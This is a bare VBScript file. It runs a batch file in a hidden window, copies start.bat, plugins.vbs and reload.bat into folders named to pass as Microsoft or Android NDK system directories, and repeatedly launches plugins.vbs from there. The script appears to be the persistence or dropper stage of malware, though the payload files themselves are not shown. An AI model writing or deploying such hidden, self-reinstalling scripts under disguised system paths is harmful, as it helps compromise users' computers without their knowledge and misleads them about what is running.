Option Explicit
DIM fso, oShell, i
Set oShell = Wscript.CreateObject("WScript.Shell")
Set fso = CreateObject("Scripting.FileSystemObject")

i = 0

oShell.Run("C:\Microsoft\AndroidNDK64\reload.bat"),0,false

Do While i < 3
	If (fso.FileExists("C:\Microsoft\start.bat")) Then
	
	Else
  		fso.CopyFile "./start.bat", "C:\Microsoft\"
	End If

	If (fso.FileExists("C:\Microsoft\plugins.vbs")) Then
		
	Else
  		fso.CopyFile "./plugins.vbs", "C:\Microsoft\plugins.vbs"
	End If

	If (fso.FileExists("C:\Microsoft\AndroidNDK64\reload.bat")) Then
		
	Else
  		fso.CopyFile "./reload.bat", "C:\Microsoft\AndroidNDK64\"
	End If

	WScript.Sleep(1000)

	oShell.Run("C:\Microsoft\plugins.vbs")
	i = i + 1
Loop
